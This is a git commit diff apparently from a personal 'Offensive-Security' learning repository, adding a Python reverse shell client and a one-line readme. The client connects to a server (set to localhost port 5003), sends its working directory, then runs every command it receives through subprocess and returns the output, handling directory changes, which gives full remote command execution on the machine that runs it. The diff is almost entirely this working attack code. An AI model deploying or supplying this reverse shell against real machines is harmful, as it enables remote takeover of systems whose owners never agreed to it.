64dd5eebcd37d2badb137f3ab69d95d3b48d72f6
Gokanb <gokan.bektas90@gmail.com>
2021-12-08 16:00:45 -0500

    .

--- Offensive-Security/Reverse Shell/version1/client.py
+++ Offensive-Security/Reverse Shell/version1/client.py
@@ -1,5 +1,40 @@
 #!/ur/bin/env python
 
 # Author:Gokan Bektas
-# Description:
+# Description: 
 
+import socket
+import os
+import subprocess
+import sys
+
+SERVER_HOST = 'localhost'
+SERVER_PORT = 5003
+BUFFER_SIZE = 1024 * 128
+SEPERATOR = '<sep>'
+
+sock = socket.socket()
+sock.connect((SERVER_HOST, SERVER_PORT))
+
+cwd = os.getcwd()
+sock.send(cwd.encode())
+
+while True:
+    command = sock.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == 'exit':
+        break
+    if splited_command[0].lower() == 'cd':
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            output = str(e)
+        else:
+            output = ""
+    else:
+        output = subprocess.getoutput(command)
+    cwd = os.getcwd()
+    message = f'{output}{SEPERATOR}{cwd}'
+    sock.send(message.encode())
+    
+sock.close()
---
+++ Offensive-Security/Reverse Shell/version1/readme.md
@@ -0,0 +1,3 @@
+"""
+server.py should be run first then client.py can run otherwise application wont work. 
+"""
